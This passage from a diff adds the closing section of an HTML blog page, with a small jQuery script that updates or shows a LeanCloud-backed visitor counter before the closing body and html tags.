+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
